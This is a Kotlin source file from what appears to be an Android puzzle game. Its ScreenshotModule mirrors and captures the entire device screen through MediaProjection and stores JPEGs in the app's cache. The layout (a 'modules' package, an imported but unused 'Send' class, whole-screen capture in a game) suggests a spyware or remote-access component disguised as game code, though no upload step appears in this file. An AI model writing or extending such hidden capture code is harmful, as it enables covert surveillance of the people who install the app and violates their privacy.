package com.puzzleblast.game.modules

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import com.puzzleblast.game.core.Send
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import kotlin.coroutines.resume

object ScreenshotModule {
    var projection: MediaProjection? = null
    var resultCode: Int = 0
    var resultData: Intent? = null

    fun onProjectionResult(code: Int, data: Intent) {
        resultCode = code; resultData = data
    }

    suspend fun capture(ctx: Context): File? = suspendCancellableCoroutine { cont ->
        try {
            val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val mp = projection ?: run {
                val rd = resultData ?: run { cont.resume(null); return@suspendCancellableCoroutine }
                mpm.getMediaProjection(resultCode, rd).also { projection = it }
            }
            val metrics = ctx.resources.displayMetrics
            val w = metrics.widthPixels; val h = metrics.heightPixels; val d = metrics.densityDpi
            val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
            val vd: VirtualDisplay = mp.createVirtualDisplay("cap", w, h, d,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, Handler(Looper.getMainLooper()))
            reader.setOnImageAvailableListener({ r ->
                try {
                    val img: Image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val plane = img.planes[0]
                    val buf: ByteBuffer = plane.buffer
                    val pixelStride = plane.pixelStride
                    val rowStride = plane.rowStride
                    val rowPadding = rowStride - pixelStride * w
                    val bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888)
                    bmp.copyPixelsFromBuffer(buf)
                    val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
                    img.close()
                    vd.release()
                    val out = File(ctx.cacheDir, "shot_${System.currentTimeMillis()}.jpg")
                    FileOutputStream(out).use { cropped.compress(Bitmap.CompressFormat.JPEG, 85, it) }
                    cont.resume(out)
                } catch (e: Exception) {
                    cont.resume(null)
                }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) {
            cont.resume(null)
        }
    }
}
